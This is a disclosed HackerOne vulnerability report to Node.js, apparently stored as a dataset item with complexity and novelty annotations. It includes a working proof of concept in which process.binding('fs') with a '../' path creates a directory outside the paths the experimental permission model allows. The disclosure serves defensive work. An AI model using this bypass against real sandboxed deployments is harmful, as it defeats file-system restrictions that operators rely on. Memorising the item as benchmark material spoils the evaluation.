{
  "reported_to": "Node.js",
  "reported_by": "rafaelgss ",
  "title": "process.binding() can bypass the permission model through path traversal",
  "content": "\nSummary: process.binding('fs') bypassed the permission model validation against path traversal\nDescription: process.binding('fs') can be used to bypass the path traversal validation for the permisison model\nSteps To Reproduce:\nCreate the following index.js and store at /home/pathtraversal/\nCode 110 Bytes\n1// index.js\n2const fs = process.binding('fs')\n3\n4fs.mkdir('/home/pathtraversal/../test0', 511, false, null, null)\nCode 149 Bytes\n1$ pwd\n2/home/pathtraversal/\n3$ node --experimental-permission --allow-fs-read=\"/home/pathtraversal/*\" --allow-fs-write=\"/home/pathtraversal/*\" index.js\n/home/test0 will be created bypassing the permission model validation\nImpact\nAll the methods exposed by the process.binding('fs') could eventually bypass the permission model using path traversal. It will require the attacker to read the node_file.cc implementation, but that's trivial.\n\n",
  "severity": [
    7.1,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1694373960,
  "report_url": "https://hackerone.com/reports/2051257",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create an index.js file with the following content:\nconst fs = process.binding('fs')\nfs.mkdir('/home/pathtraversal/../test0', 511, false, null, null)"
    ],
    [
      2,
      "Run the script with Node.js using the experimental permission flag:\nnode --experimental-permission --allow-fs-read=\"/home/pathtraversal/*\" --allow-fs-write=\"/home/pathtraversal/*\" index.js"
    ]
  ],
  "vuln_description": "The vulnerability allows bypassing the Node.js permission model's path traversal validation by using process.binding('fs') to access the file system directly. This enables unauthorized directory creation outside the permitted paths.",
  "reason": "The attack involves understanding Node.js internals (process.binding) and the permission model's path traversal validation, but the core issue is straightforward once these components are known. The interaction between process.binding and the permission model is non-obvious but doesn't require complex state manipulation or novel logic.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}